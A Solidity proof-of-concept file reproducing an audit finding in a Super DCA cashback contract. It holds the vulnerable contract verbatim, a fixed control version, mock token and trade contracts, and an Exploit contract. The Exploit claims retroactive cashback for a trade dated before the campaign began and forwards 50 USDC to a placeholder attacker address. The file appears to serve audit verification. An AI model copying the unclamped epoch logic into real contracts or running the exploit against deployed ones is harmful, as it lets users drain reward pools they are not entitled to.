// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ============================================================================
// Synthetic, self-contained reproduction of Super DCA (super-dca-cashback)
// finding 63419-H-1: "Users with pre-campaign trades will drain cashback funds
// by claiming retroactive rewards for periods before the campaign existed."
//
// The vulnerable contract `SuperDCACashback` below is inlined VERBATIM from the
// audited source (super-dca-cashback/src/SuperDCACashback.sol, Sherlock
// 2025-09-super-dca). Only the `import` statements and the file `pragma` were
// stripped; every function body is byte-identical to the audited (pre-fix) code.
//
// Root cause (see the `// @>` marker in `_calculateEpochData`): the contract
// computes `timeElapsed = block.timestamp - trade.startTime` and never clamps
// `trade.startTime` UP to `cashbackClaim.startTime` (the campaign start). A trade
// created BEFORE the campaign therefore accrues "completed epochs" for the whole
// pre-campaign period, letting its owner claim USDC cashback for time before the
// campaign existed -- draining the pool beyond entitlement.
//
// Minimal faithful doubles (standard infra / the opaque external boundary only):
//   - IERC20 / SafeERC20 / IERC721 / AccessControl : standard OpenZeppelin infra.
//   - USDCToken           : a 6-decimal ERC20 standing in for USDC.
//   - SuperDCATradeMock   : the external SuperDCATrade NFT (ERC721 `ownerOf` +
//                           `trades(id)`). This is the opaque external boundary,
//                           NOT the vulnerable contract.
// The vulnerable contract itself (`SuperDCACashback`) is real and unmodified.
// `SuperDCACashbackFixed` is the negative control: identical, but it clamps the
// epoch start to `max(trade.startTime, cashbackClaim.startTime)`.
// ============================================================================

// ---------------------------------------------------------------------------
// Standard OpenZeppelin infra (minimal faithful doubles).
// ---------------------------------------------------------------------------
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

library SafeERC20 {
    function safeTransfer(IERC20 token, address to, uint256 value) internal {
        (bool ok, bytes memory ret) =
            address(token).call(abi.encodeWithSelector(IERC20.transfer.selector, to, value));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "SafeERC20: transfer failed");
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {
        (bool ok, bytes memory ret) =
            address(token).call(abi.encodeWithSelector(IERC20.transferFrom.selector, from, to, value));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "SafeERC20: transferFrom failed");
    }
}

interface IERC721 {
    function ownerOf(uint256 tokenId) external view returns (address owner);
}

abstract contract AccessControl {
    bytes32 public constant DEFAULT_ADMIN_ROLE = 0x00;
    mapping(bytes32 => mapping(address => bool)) private _roles;

    error AccessControlUnauthorizedAccount(address account, bytes32 neededRole);

    modifier onlyRole(bytes32 role) {
        if (!hasRole(role, msg.sender)) revert AccessControlUnauthorizedAccount(msg.sender, role);
        _;
    }

    function hasRole(bytes32 role, address account) public view virtual returns (bool) {
        return _roles[role][account];
    }

    function _grantRole(bytes32 role, address account) internal virtual returns (bool) {
        if (!hasRole(role, account)) {
            _roles[role][account] = true;
            return true;
        }
        return false;
    }
}

// ---------------------------------------------------------------------------
// Real audited interface (verbatim from super-dca-cashback/src/interfaces/ISuperDCATrade.sol).
// ---------------------------------------------------------------------------
interface ISuperDCATrade {
    struct Trade {
        uint256 tradeId;
        uint256 startTime;
        uint256 endTime;
        int96 flowRate;
        uint256 startIdaIndex;
        uint256 endIdaIndex;
        uint256 units;
        uint256 refunded;
    }

    event TradeStarted(address indexed trader, uint256 indexed tradeId);
    event TradeEnded(address indexed trader, uint256 indexed tradeId);

    function trades(uint256 tradeId) external view returns (Trade memory);
    function tradesByUser(address user, uint256 index) external view returns (uint256);
    function tradeCountsByUser(address user) external view returns (uint256);

    function startTrade(address _shareholder, int96 _flowRate, uint256 _indexValue, uint256 _units)
        external;
    function endTrade(address _shareholder, uint256 _indexValue, uint256 _refunded) external;
    function getLatestTrade(address _trader) external view returns (Trade memory trade);
    function getTradeInfo(address _trader, uint256 _index) external view returns (Trade memory trade);
}

// ---------------------------------------------------------------------------
// Opaque external boundary doubles (NOT the vulnerable contract).
// ---------------------------------------------------------------------------

/// @dev 6-decimal ERC20 standing in for USDC. The cashback pool is held here.
contract USDCToken {
    string public name = "USD Coin";
    string public symbol = "USDC";
    uint8 public constant decimals = 6;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

/// @dev Minimal faithful double for the external SuperDCATrade NFT: it exposes
///      `trades(id)` (ABI-identical to the real ISuperDCATrade.Trade) and the
///      ERC721 `ownerOf(id)` used by SuperDCACashback._getTradeOwner. `createTrade`
///      lets the harness set an explicit pre-campaign startTime (the real contract
///      stamps `block.timestamp`; we need a historical start with no cheatcodes).
contract SuperDCATradeMock {
    mapping(uint256 => ISuperDCATrade.Trade) private _trades;
    mapping(uint256 => address) private _owners;

    function createTrade(address to, uint256 tradeId, uint256 startTime, uint256 endTime, int96 flowRate)
        external
    {
        _trades[tradeId] = ISuperDCATrade.Trade({
            tradeId: tradeId,
            startTime: startTime,
            endTime: endTime,
            flowRate: flowRate,
            startIdaIndex: 0,
            endIdaIndex: 0,
            units: 0,
            refunded: 0
        });
        _owners[tradeId] = to;
    }

    function trades(uint256 tradeId) external view returns (ISuperDCATrade.Trade memory) {
        return _trades[tradeId];
    }

    function ownerOf(uint256 tokenId) external view returns (address) {
        address o = _owners[tokenId];
        require(o != address(0), "ERC721: invalid token ID");
        return o;
    }
}

// ============================================================================
// VULNERABLE contract -- inlined VERBATIM from
// super-dca-cashback/src/SuperDCACashback.sol (imports & pragma stripped only).
// ============================================================================
contract SuperDCACashback is AccessControl {
  using SafeERC20 for IERC20;

  /// @notice The USDC token used for cashback payments
  IERC20 public immutable USDC;

  /// @notice The SuperDCATrade contract interface
  ISuperDCATrade public immutable SUPER_DCA_TRADE;

  /// @notice Admin role identifier
  bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");

  /// @notice Struct representing a cashback claim
  struct CashbackClaim {
    uint256 cashbackBips; // Cashback percentage in basis points (e.g., 25 = 0.25%)
    uint256 duration; // Epoch duration in seconds
    int96 minRate; // Minimum flow rate for eligibility
    uint256 maxRate; // Maximum flow rate for eligibility
    uint256 startTime; // Start time of epoch 0
    uint256 timestamp; // When the claim was created
  }

  /// @notice The single cashback claim configuration for this contract
  CashbackClaim public cashbackClaim;

  /// @notice Mapping of tradeId to total claimed amount in USDC (6 decimals)
  mapping(uint256 tradeId => uint256 claimedAmount) public claimedAmounts;

  /// @notice Emitted when cashback is claimed
  event CashbackClaimed(address indexed user, uint256 indexed tradeId, uint256 amount);

  /// @notice Emitted when tokens are withdrawn by admin
  event TokensWithdrawn(address indexed token, address indexed to, uint256 amount);

  /// @notice Emitted when a parameter is invalid
  /// @param paramIndex The index of the invalid parameter
  error InvalidParams(uint256 paramIndex);

  /// @notice Emitted when a claim is not claimable
  error NotClaimable();

  /// @notice Emitted when a user is not authorized to claim cashback
  error NotAuthorized();

  /// @notice Constructor
  /// @param _usdc The USDC token contract address
  /// @param _superDCATrade The SuperDCATrade contract address
  /// @param _admin The initial admin address
  /// @param _cashbackClaim The cashback claim configuration
  constructor(
    address _usdc,
    address _superDCATrade,
    address _admin,
    CashbackClaim memory _cashbackClaim
  ) {
    // Validate parameters
    if (_cashbackClaim.cashbackBips > 10_000) revert InvalidParams(0); // Max 100%
    if (_cashbackClaim.maxRate > uint256(uint96(type(int96).max))) revert InvalidParams(2);
    if (_cashbackClaim.minRate >= int96(int256(_cashbackClaim.maxRate))) revert InvalidParams(2);
    if (_cashbackClaim.duration == 0) revert InvalidParams(1);

    USDC = IERC20(_usdc);
    SUPER_DCA_TRADE = ISuperDCATrade(_superDCATrade);
    cashbackClaim = _cashbackClaim;
    cashbackClaim.timestamp = block.timestamp;

    _grantRole(DEFAULT_ADMIN_ROLE, _admin);
    _grantRole(ADMIN_ROLE, _admin);
  }

  /// @notice Get trade cashback status showing claimable, pending, and claimed amounts
  /// @param tradeId The trade ID to check
  /// @return claimable Amount that can be claimed from completed epochs (USDC 6 decimals)
  /// @return pending Amount pending in the current incomplete epoch (USDC 6 decimals)
  /// @return claimed Amount already claimed for this trade (USDC 6 decimals)
  function getTradeStatus(uint256 tradeId)
    external
    view
    returns (uint256 claimable, uint256 pending, uint256 claimed)
  {
    ISuperDCATrade.Trade memory trade = SUPER_DCA_TRADE.trades(tradeId);

    // If trade doesn't exist or doesn't meet requirements, return zeros
    if (!_isTradeValid(trade)) return (0, 0, 0);

    claimed = claimedAmounts[tradeId];

    // Calculate epoch timing data
    (uint256 completedEpochs, uint256 incompleteEpochTime) = _calculateEpochData(trade);

    if (completedEpochs == 0 && incompleteEpochTime == 0) return (0, 0, claimed);

    // Get effective flow rate (capped at maxRate)
    uint256 effectiveFlowRate = _getEffectiveFlowRate(trade.flowRate);

    // Calculate claimable amount from completed epochs
    uint256 totalCompletedAmount =
      _calculateCompletedEpochsCashback(trade, effectiveFlowRate, completedEpochs);

    if (totalCompletedAmount > claimed) claimable = totalCompletedAmount - claimed;

    // Calculate pending amount from incomplete epoch
    pending = _calculatePendingCashback(trade, effectiveFlowRate, incompleteEpochTime);
  }

  /// @notice Internal version of getTradeStatus to avoid external call overhead
  /// @param tradeId The trade ID to check
  /// @param trade The trade data (fetched externally to avoid double SLOAD)
  function _getTradeStatusInternal(uint256 tradeId, ISuperDCATrade.Trade memory trade)
    internal
    view
    returns (uint256 claimable, uint256 pending, uint256 claimed)
  {
    // If trade doesn't exist or doesn't meet requirements, return zeros
    if (!_isTradeValid(trade)) return (0, 0, 0);

    claimed = claimedAmounts[tradeId];

    // Calculate epoch timing data
    (uint256 completedEpochs, uint256 incompleteEpochTime) = _calculateEpochData(trade);

    if (completedEpochs == 0 && incompleteEpochTime == 0) return (0, 0, claimed);

    // Get effective flow rate (capped at maxRate)
    uint256 effectiveFlowRate = _getEffectiveFlowRate(trade.flowRate);

    // Calculate claimable amount from completed epochs
    uint256 totalCompletedAmount =
      _calculateCompletedEpochsCashback(trade, effectiveFlowRate, completedEpochs);

    if (totalCompletedAmount > claimed) claimable = totalCompletedAmount - claimed;

    // Calculate pending amount from incomplete epoch
    pending = _calculatePendingCashback(trade, effectiveFlowRate, incompleteEpochTime);
  }

  /// @notice Check if trade is valid for cashback calculations
  /// @param trade The trade data
  /// @return valid True if trade meets all requirements
  function _isTradeValid(ISuperDCATrade.Trade memory trade) internal view returns (bool valid) {
    return trade.startTime > 0 && trade.flowRate >= int96(cashbackClaim.minRate); // @> never checks trade.startTime >= cashbackClaim.startTime (campaign start)
  }

  /// @notice Calculate epoch timing data for a trade
  /// @param trade The trade data
  /// @return completedEpochs Number of complete epochs
  /// @return incompleteEpochTime Time elapsed in current incomplete epoch
  function _calculateEpochData(ISuperDCATrade.Trade memory trade)
    internal
    view
    returns (uint256 completedEpochs, uint256 incompleteEpochTime)
  {
    uint256 currentTime = block.timestamp;
    if (currentTime <= trade.startTime) return (0, 0);

    uint256 timeElapsed = currentTime - trade.startTime; // @> no clamp to cashbackClaim.startTime: counts pre-campaign time as completed epochs
    completedEpochs = timeElapsed / cashbackClaim.duration;
    incompleteEpochTime = timeElapsed % cashbackClaim.duration;
  }

  /// @notice Get effective flow rate capped at maximum rate
  /// @param flowRate The original flow rate
  /// @return effectiveFlowRate The capped flow rate
  function _getEffectiveFlowRate(int96 flowRate) internal view returns (uint256 effectiveFlowRate) {
    effectiveFlowRate = uint256(int256(flowRate));
    if (effectiveFlowRate > cashbackClaim.maxRate) effectiveFlowRate = cashbackClaim.maxRate;
  }

  /// @notice Convert an amount from 1e18 precision (flow rate) to 1e6 precision (USDC)
  /// @param amount The amount in 1e18 precision
  /// @return convertedAmount The amount converted to 1e6 precision
  function _convertToUSDCPrecision(uint256 amount) internal pure returns (uint256 convertedAmount) {
    convertedAmount = amount / 1e12;
  }

  /// @notice Calculate cashback from completed epochs. Only fully completed
  /// epochs are eligible for rewards. If a trade ends before an epoch is
  /// finished, that incomplete epoch at trade end is forfeited (not eligible for rewards).
  /// @param trade The trade data
  /// @param effectiveFlowRate The effective (capped) flow rate
  /// @param completedEpochs Number of completed epochs at the current block timestamp
  /// @return totalAmount Total cashback amount in USDC (6 decimals)
  function _calculateCompletedEpochsCashback(
    ISuperDCATrade.Trade memory trade,
    uint256 effectiveFlowRate,
    uint256 completedEpochs
  ) internal view returns (uint256 totalAmount) {
    if (completedEpochs == 0) return 0;

    // When the trade has already ended, cap the completedEpochs to the number
    // of epochs that fully elapsed before the end time. Any epoch that was
    // still in progress at the moment of `endTime` is not eligible.
    if (trade.endTime > 0) {
      uint256 tradeDuration = trade.endTime - trade.startTime;
      // Integer division intentionally truncates any partial epoch.
      // Only fully completed epochs before endTime are eligible for cashback.
      uint256 epochsBeforeEnd = tradeDuration / cashbackClaim.duration;
      if (epochsBeforeEnd < completedEpochs) completedEpochs = epochsBeforeEnd;
    }

    if (completedEpochs == 0) return 0;

    // Reward for all eligible completed epochs
    uint256 completedAmount = effectiveFlowRate * cashbackClaim.duration * completedEpochs;
    totalAmount = (completedAmount * cashbackClaim.cashbackBips) / 10_000;

    // Convert from 1e18 precision (flow rate) to 1e6 precision (USDC)
    totalAmount = _convertToUSDCPrecision(totalAmount);
  }

  /// @notice Calculate pending cashback from incomplete epoch
  /// @param trade The trade data
  /// @param effectiveFlowRate The effective flow rate
  /// @param incompleteEpochTime Time elapsed in incomplete epoch
  /// @return pending Pending cashback amount in USDC (6 decimals)
  function _calculatePendingCashback(
    ISuperDCATrade.Trade memory trade,
    uint256 effectiveFlowRate,
    uint256 incompleteEpochTime
  ) internal view returns (uint256 pending) {
    // Only calculate pending if trade is still active and there's incomplete time
    if ((trade.endTime == 0 || trade.endTime > block.timestamp) && incompleteEpochTime > 0) {
      uint256 pendingAmount = effectiveFlowRate * incompleteEpochTime;
      pending = (pendingAmount * cashbackClaim.cashbackBips) / 10_000;
      pending = _convertToUSDCPrecision(pending); // Convert to USDC precision
    }
  }

  /// @notice Claim all available cashback for a trade
  /// @param tradeId The trade ID to claim cashback for
  /// @return totalCashback The total amount of cashback claimed
  function claimAllCashback(uint256 tradeId) external returns (uint256 totalCashback) {
    // Get trade information
    ISuperDCATrade.Trade memory trade = SUPER_DCA_TRADE.trades(tradeId);

    // Verify trade exists
    if (trade.startTime == 0) revert NotClaimable();

    // Verify the caller owns this trade
    address tradeOwner = _getTradeOwner(tradeId);
    if (tradeOwner != msg.sender) revert NotAuthorized();

    // Get claimable amount using the same logic as getTradeStatus
    (uint256 claimable,,) = _getTradeStatusInternal(tradeId, trade);

    // If no claimable amount, revert
    if (claimable == 0) revert NotClaimable();

    totalCashback = claimable;

    // Update claimed amount tracking
    claimedAmounts[tradeId] += totalCashback;

    // Transfer cashback to user
    USDC.safeTransfer(msg.sender, totalCashback);

    // Emit event for the claim
    emit CashbackClaimed(msg.sender, tradeId, totalCashback);
  }

  /// @notice Get information about the cashback claim configuration
  /// @return claim The cashback claim information
  function getCashbackClaim() external view returns (CashbackClaim memory claim) {
    claim = cashbackClaim;
  }

  /// @notice Withdraw any ERC20 token from the contract
  /// @param token The token contract address to withdraw
  /// @param to The address to send the tokens to
  /// @param amount The amount of tokens to withdraw
  function withdrawTokens(address token, address to, uint256 amount) external onlyRole(ADMIN_ROLE) {
    if (to == address(0)) revert InvalidParams(1);
    if (amount == 0) revert InvalidParams(2);

    IERC20(token).safeTransfer(to, amount);

    emit TokensWithdrawn(token, to, amount);
  }

  /// @notice Internal function to get the owner of a trade
  /// @param tradeId The trade ID
  /// @return owner The owner address
  function _getTradeOwner(uint256 tradeId) internal view returns (address owner) {
    // Assuming SuperDCATrade is an ERC721 contract where trades are NFTs
    // We'll need to use a try-catch in case the interface doesn't support ownerOf
    try IERC721(address(SUPER_DCA_TRADE)).ownerOf(tradeId) returns (address _owner) {
      return _owner;
    } catch {
      // If ownerOf fails, we could implement alternative logic
      // For now, we'll revert to indicate the trade ownership couldn't be determined
      revert NotAuthorized();
    }
  }
}

// ============================================================================
// FIXED contract (negative control): identical to SuperDCACashback except
// `_calculateEpochData` clamps the epoch start to the campaign start, so
// pre-campaign time is never counted. Everything else is unchanged.
// ============================================================================
contract SuperDCACashbackFixed is AccessControl {
  using SafeERC20 for IERC20;

  IERC20 public immutable USDC;
  ISuperDCATrade public immutable SUPER_DCA_TRADE;
  bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");

  struct CashbackClaim {
    uint256 cashbackBips;
    uint256 duration;
    int96 minRate;
    uint256 maxRate;
    uint256 startTime;
    uint256 timestamp;
  }

  CashbackClaim public cashbackClaim;
  mapping(uint256 tradeId => uint256 claimedAmount) public claimedAmounts;

  event CashbackClaimed(address indexed user, uint256 indexed tradeId, uint256 amount);
  event TokensWithdrawn(address indexed token, address indexed to, uint256 amount);

  error InvalidParams(uint256 paramIndex);
  error NotClaimable();
  error NotAuthorized();

  constructor(
    address _usdc,
    address _superDCATrade,
    address _admin,
    CashbackClaim memory _cashbackClaim
  ) {
    if (_cashbackClaim.cashbackBips > 10_000) revert InvalidParams(0);
    if (_cashbackClaim.maxRate > uint256(uint96(type(int96).max))) revert InvalidParams(2);
    if (_cashbackClaim.minRate >= int96(int256(_cashbackClaim.maxRate))) revert InvalidParams(2);
    if (_cashbackClaim.duration == 0) revert InvalidParams(1);

    USDC = IERC20(_usdc);
    SUPER_DCA_TRADE = ISuperDCATrade(_superDCATrade);
    cashbackClaim = _cashbackClaim;
    cashbackClaim.timestamp = block.timestamp;

    _grantRole(DEFAULT_ADMIN_ROLE, _admin);
    _grantRole(ADMIN_ROLE, _admin);
  }

  function getTradeStatus(uint256 tradeId)
    external
    view
    returns (uint256 claimable, uint256 pending, uint256 claimed)
  {
    ISuperDCATrade.Trade memory trade = SUPER_DCA_TRADE.trades(tradeId);
    if (!_isTradeValid(trade)) return (0, 0, 0);
    claimed = claimedAmounts[tradeId];
    (uint256 completedEpochs, uint256 incompleteEpochTime) = _calculateEpochData(trade);
    if (completedEpochs == 0 && incompleteEpochTime == 0) return (0, 0, claimed);
    uint256 effectiveFlowRate = _getEffectiveFlowRate(trade.flowRate);
    uint256 totalCompletedAmount =
      _calculateCompletedEpochsCashback(trade, effectiveFlowRate, completedEpochs);
    if (totalCompletedAmount > claimed) claimable = totalCompletedAmount - claimed;
    pending = _calculatePendingCashback(trade, effectiveFlowRate, incompleteEpochTime);
  }

  function _getTradeStatusInternal(uint256 tradeId, ISuperDCATrade.Trade memory trade)
    internal
    view
    returns (uint256 claimable, uint256 pending, uint256 claimed)
  {
    if (!_isTradeValid(trade)) return (0, 0, 0);
    claimed = claimedAmounts[tradeId];
    (uint256 completedEpochs, uint256 incompleteEpochTime) = _calculateEpochData(trade);
    if (completedEpochs == 0 && incompleteEpochTime == 0) return (0, 0, claimed);
    uint256 effectiveFlowRate = _getEffectiveFlowRate(trade.flowRate);
    uint256 totalCompletedAmount =
      _calculateCompletedEpochsCashback(trade, effectiveFlowRate, completedEpochs);
    if (totalCompletedAmount > claimed) claimable = totalCompletedAmount - claimed;
    pending = _calculatePendingCashback(trade, effectiveFlowRate, incompleteEpochTime);
  }

  function _isTradeValid(ISuperDCATrade.Trade memory trade) internal view returns (bool valid) {
    return trade.startTime > 0 && trade.flowRate >= int96(cashbackClaim.minRate);
  }

  function _calculateEpochData(ISuperDCATrade.Trade memory trade)
    internal
    view
    returns (uint256 completedEpochs, uint256 incompleteEpochTime)
  {
    uint256 currentTime = block.timestamp;
    // FIX: never count time before the campaign started.
    uint256 effectiveStart = trade.startTime;
    if (effectiveStart < cashbackClaim.startTime) effectiveStart = cashbackClaim.startTime;
    if (currentTime <= effectiveStart) return (0, 0);

    uint256 timeElapsed = currentTime - effectiveStart;
    completedEpochs = timeElapsed / cashbackClaim.duration;
    incompleteEpochTime = timeElapsed % cashbackClaim.duration;
  }

  function _getEffectiveFlowRate(int96 flowRate) internal view returns (uint256 effectiveFlowRate) {
    effectiveFlowRate = uint256(int256(flowRate));
    if (effectiveFlowRate > cashbackClaim.maxRate) effectiveFlowRate = cashbackClaim.maxRate;
  }

  function _convertToUSDCPrecision(uint256 amount) internal pure returns (uint256 convertedAmount) {
    convertedAmount = amount / 1e12;
  }

  function _calculateCompletedEpochsCashback(
    ISuperDCATrade.Trade memory trade,
    uint256 effectiveFlowRate,
    uint256 completedEpochs
  ) internal view returns (uint256 totalAmount) {
    if (completedEpochs == 0) return 0;
    if (trade.endTime > 0) {
      uint256 tradeDuration = trade.endTime - trade.startTime;
      uint256 epochsBeforeEnd = tradeDuration / cashbackClaim.duration;
      if (epochsBeforeEnd < completedEpochs) completedEpochs = epochsBeforeEnd;
    }
    if (completedEpochs == 0) return 0;
    uint256 completedAmount = effectiveFlowRate * cashbackClaim.duration * completedEpochs;
    totalAmount = (completedAmount * cashbackClaim.cashbackBips) / 10_000;
    totalAmount = _convertToUSDCPrecision(totalAmount);
  }

  function _calculatePendingCashback(
    ISuperDCATrade.Trade memory trade,
    uint256 effectiveFlowRate,
    uint256 incompleteEpochTime
  ) internal view returns (uint256 pending) {
    if ((trade.endTime == 0 || trade.endTime > block.timestamp) && incompleteEpochTime > 0) {
      uint256 pendingAmount = effectiveFlowRate * incompleteEpochTime;
      pending = (pendingAmount * cashbackClaim.cashbackBips) / 10_000;
      pending = _convertToUSDCPrecision(pending);
    }
  }

  function claimAllCashback(uint256 tradeId) external returns (uint256 totalCashback) {
    ISuperDCATrade.Trade memory trade = SUPER_DCA_TRADE.trades(tradeId);
    if (trade.startTime == 0) revert NotClaimable();
    address tradeOwner = _getTradeOwner(tradeId);
    if (tradeOwner != msg.sender) revert NotAuthorized();
    (uint256 claimable,,) = _getTradeStatusInternal(tradeId, trade);
    if (claimable == 0) revert NotClaimable();
    totalCashback = claimable;
    claimedAmounts[tradeId] += totalCashback;
    USDC.safeTransfer(msg.sender, totalCashback);
    emit CashbackClaimed(msg.sender, tradeId, totalCashback);
  }

  function _getTradeOwner(uint256 tradeId) internal view returns (address owner) {
    try IERC721(address(SUPER_DCA_TRADE)).ownerOf(tradeId) returns (address _owner) {
      return _owner;
    } catch {
      revert NotAuthorized();
    }
  }
}

// ============================================================================
// Exploit driver: an attacker owns a trade created BEFORE the campaign existed.
// The buggy contract pays them cashback for 5 completed epochs -- ALL predating
// the campaign start -- while a correctly-clamped contract owes 0. The drained
// USDC is forwarded to the attacker EOA (real theft from the cashback pool).
// ============================================================================
contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    uint256 internal constant EPOCH = 1_000_000;   // epoch length in seconds
    uint256 internal constant CASHBACK_BIPS = 100; // 1%
    int96 internal constant MIN_RATE = 1e14;
    uint256 internal constant MAX_RATE = 1e16;
    int96 internal constant FLOW_RATE = 1e15;      // effective per-epoch reward = 10 USDC
    uint256 internal constant POOL = 60_000_000;   // 60 USDC (6 decimals) funded into the pool
    uint256 internal constant TRADE_ID = 1;

    // exposed results
    uint256 public buggyClaimed;
    uint256 public fixedClaimable;
    uint256 public theftAmount;
    uint256 public attackerBalance;
    uint256 public poolRemaining;
    uint256 public campaignStart;
    uint256 public tradeStart;
    uint256 public claimTime;

    address public usdcAddr;
    address public tradeAddr;
    address public cashbackAddr;
    address public fixedAddr;

    function run() external payable {
        uint256 nowTs = block.timestamp;
        // Guard: we place the trade 5.5 epochs in the past, so we need headroom.
        require(nowTs > 6 * EPOCH, "warp block.timestamp above 6e6 before run()");

        // --- deploy doubles + the REAL vulnerable contract (fixed order) ---
        USDCToken usdc = new USDCToken();                    // deploy 0
        SuperDCATradeMock trade = new SuperDCATradeMock();   // deploy 1

        // Campaign started half an epoch ago -> a fair participant has 0 completed
        // epochs yet. The attacker's trade started 5.5 epochs ago -> 5 completed
        // epochs, EVERY one of which predates the campaign start.
        uint256 t2 = nowTs - (EPOCH / 2);        // cashbackClaim.startTime (campaign start)
        uint256 t1 = nowTs - (11 * EPOCH / 2);   // trade.startTime (5.5 epochs ago, pre-campaign)
        campaignStart = t2;
        tradeStart = t1;
        claimTime = nowTs;

        SuperDCACashback.CashbackClaim memory claim = SuperDCACashback.CashbackClaim({
            cashbackBips: CASHBACK_BIPS,
            duration: EPOCH,
            minRate: MIN_RATE,
            maxRate: MAX_RATE,
            startTime: t2,
            timestamp: 0
        });
        SuperDCACashback cashback =
            new SuperDCACashback(address(usdc), address(trade), address(this), claim); // deploy 2

        SuperDCACashbackFixed.CashbackClaim memory claimF = SuperDCACashbackFixed.CashbackClaim({
            cashbackBips: CASHBACK_BIPS,
            duration: EPOCH,
            minRate: MIN_RATE,
            maxRate: MAX_RATE,
            startTime: t2,
            timestamp: 0
        });
        SuperDCACashbackFixed fixedCashback =
            new SuperDCACashbackFixed(address(usdc), address(trade), address(this), claimF); // deploy 3

        usdcAddr = address(usdc);
        tradeAddr = address(trade);
        cashbackAddr = address(cashback);
        fixedAddr = address(fixedCashback);

        // --- attacker owns a PRE-CAMPAIGN trade (NFT minted to this Exploit) ---
        trade.createTrade(address(this), TRADE_ID, t1, 0, FLOW_RATE);

        // --- fund the cashback USDC pool ---
        usdc.mint(address(cashback), POOL);

        // --- BUGGY path: claim retroactive cashback for the pre-campaign epochs ---
        buggyClaimed = cashback.claimAllCashback(TRADE_ID);

        // --- what a correctly-clamped contract would owe for the SAME trade ---
        (fixedClaimable,,) = fixedCashback.getTradeStatus(TRADE_ID);

        // theft = everything claimed beyond entitlement (here entitlement is 0)
        theftAmount = buggyClaimed - fixedClaimable;

        // --- realize the theft: forward the drained USDC to the attacker EOA ---
        usdc.transfer(ATTACKER, buggyClaimed);
        attackerBalance = usdc.balanceOf(ATTACKER);
        poolRemaining = usdc.balanceOf(address(cashback));

        // --- harm asserts (concrete numbers, not a mechanism) ---
        require(buggyClaimed == 50_000_000, "buggy claim != 50 USDC");
        require(fixedClaimable == 0, "fixed should owe nothing yet");
        require(theftAmount == 50_000_000, "theft magnitude");
        require(attackerBalance == 50_000_000, "attacker did not receive stolen USDC");
    }
}
